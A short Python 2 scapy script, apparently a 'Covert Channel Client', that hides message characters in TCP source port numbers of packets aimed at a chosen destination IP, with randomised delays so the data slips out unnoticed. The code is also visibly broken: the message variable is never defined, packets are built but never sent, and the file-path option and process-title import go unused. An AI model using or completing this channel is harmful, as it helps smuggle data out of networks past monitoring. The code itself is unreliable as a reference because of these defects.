from scapy.all import IP, TCP
from random import randint
import setproctitle
import argparse
import time
#import

global maxPort
maxPort = 65535
asciiMax = 127

# creates a packet where the arguments char1 and char2 are set as the tcp source port
def createPacketTwo(char1, char2):
  # get the binary values of both chars without the binary string indicator
  binChar1 = bin(ord(char1))[2:].zfill(8)
  binChar2 = bin(ord(char2))[2:].zfill(8)
  print binChar1 + binChar2
  # get the integer value of the concatenated binary values
  intPortVal = int(binChar1 + binChar2, 2)
  print "bin value " + str((bin(intPortVal)))

  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort - intPortVal)
  return packet

# create a packet when we only have 1 character remaining
def createPacketOne(char):
  # get the binary value of the character
  binChar = bin(ord(char))[2:].zfill(8)
  print binChar
  #get the integer value of that binary value
  intPortVal = int(binChar, 2)

  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort -intPortVal)
  return packet

def sendPackets():
  index = 0;
  length = len(message)
  while index < length:
    if index == length -1:
      packet = createPacketOne(message[index])
    else:
      packet = createPacketTwo(message[index], message[index + 1])
    index = index + 2

    print "sport: " + str(packet.sport)
    time.sleep(randint(1,int(args.sendInterval)))
    # packet[0].show()

# start of execution
parser = argparse.ArgumentParser(description='Covert Channel Client')
parser.add_argument('-p'
                   , '--path'
                   , dest='path'
                   , help='absolute path to file to watch.'
                   , required=True)
parser.add_argument('-d'
                   , '--destination'
                   , dest='destIp'
                   , help='IP address to covertly send data too.'
                   , required=True)
parser.add_argument('-i'
                   , '--interval'
                   , dest='sendInterval'
                   , help='Max interval to wait between sends, in seconds.'
                   , required=True)
args = parser.parse_args()

sendPackets()